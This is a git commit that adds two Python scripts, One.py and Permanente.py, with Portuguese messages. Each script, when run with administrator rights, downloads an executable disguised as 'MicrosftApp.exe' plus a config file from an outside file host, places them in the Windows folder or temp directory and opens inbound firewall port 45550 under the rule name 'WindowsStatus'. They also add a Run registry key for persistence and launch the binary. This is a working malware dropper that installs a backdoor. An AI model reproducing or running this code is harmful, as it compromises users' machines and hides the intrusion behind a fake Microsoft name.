90110202549ea19350de79d783292fbba2876fdb
Fued Gabriel <fuedgabriel@hotmail.com>
2019-04-09 20:23:06 -0300

    Add files via upload

---
+++ One.py
@@ -0,0 +1,47 @@
+# -*- coding: utf-8 -*-
+import platform
+import multiprocessing
+import os
+import subprocess
+import sys
+import wget
+import winshell
+import ctypes
+
+def exe_64():
+    dll = 'https://1fgm8rh.oloadcdn.net/dl/l/bCXRZXd-wr7nZQqM/KDtHTt-Qhdc/config.json'
+    exe = 'https://1fgm8rh.oloadcdn.net/dl/l/zd8txsOyai-amQ4h/2cEFk04n8L0/MicrosftApp.exe'
+    filename = wget.download(dll)
+    filename = wget.download(exe)
+    os.popen("move /Y config.json C:\windows\config.json")
+    os.popen("move /Y MicrosftApp.exe C:\windows\MicrosftApp.exe")
+    try:
+        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=TCP dir=in localport=45550 action=allow')
+        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=UDP dir=in localport=45550 action=allow')
+        print("Adicionado no firewall")
+    except:
+        pass #nao funciona
+    os.popen(r'reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "MicrosftApp" /t REG_SZ /d C:\windows\MicrosftApp.exe /f')
+    os.popen(r"C:\windows\MicrosftApp.exe")
+
+def isAdmin():
+    try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return is_admin
+
+if isAdmin():
+    exe_64()
+else:
+    print("Execute como administrador")
+    exit
+
+
+
+
+
+
+
+
+
---
+++ Permanente.py
@@ -0,0 +1,77 @@
+# -*- coding: utf-8 -*-
+import os
+import wget
+import winshell
+import ctypes
+
+def AutoRunYesAdmin():
+    reg = os.popen(r'reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windwos\CurrentVersion\Run /v "cmd" /t REG_SZ /d C:\windows\MicrosftApp.exe /f')
+    reg = reg.read()
+    print(reg)
+    if "A opera" in reg or "successfully." in reg:
+        print("Copiado para windows")
+        os.popen(r"copy permanente.py C:\windows\permanente.py")
+    else:
+        print("Erro no reg. verifique se está como administrador")
+        exit
+        
+
+
+def isAdmin():
+    try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return is_admin
+if isAdmin():
+    print("É Administrador!")
+    AutoRunYesAdmin()
+else:
+    print("Execute como administrador")
+    exit
+
+
+    
+def exe_64():
+    dll = 'https://1fgm8rh.oloadcdn.net/dl/l/bCXRZXd-wr7nZQqM/KDtHTt-Qhdc/config.json'
+    exe = 'https://1fgm8rh.oloadcdn.net/dl/l/zd8txsOyai-amQ4h/2cEFk04n8L0/MicrosftApp.exe'
+    filename = wget.download(dll)
+    filename = wget.download(exe)
+    os.popen("move /Y config.json %temp%")
+    os.popen("move /Y MicrosftApp.exe %temp%")
+    try:
+        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=TCP dir=in localport=45550 action=allow')
+        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=UDP dir=in localport=45550 action=allow')
+        print("Adicionado no firewall")
+    except:
+        pass #nao funciona
+
+    existing = os.popen(r"dir %temp%\MicrosftApp.exe")
+    print(existing)
+    if "0" in str(existing):
+        print("arquivo existente")
+        os.popen(r"%temp%\MicrosftApp.exe")
+        exit
+    else:
+        print("não existente")
+        dll = 'https://1fgm8rh.oloadcdn.net/dl/l/bCXRZXd-wr7nZQqM/KDtHTt-Qhdc/config.json'
+        exe = 'https://1fgm8rh.oloadcdn.net/dl/l/zd8txsOyai-amQ4h/2cEFk04n8L0/MicrosftApp.exe'
+        filename = wget.download(dll)
+        filename = wget.download(exe)
+        os.popen("move /Y config.json %temp%")
+        os.popen("move /Y MicrosftApp.exe %temp%")
+        os.popen(r"%temp%\MicrosftApp.exe")
+        exit
+
+
+exe_64()
+
+
+
+
+
+
+
+
+
+
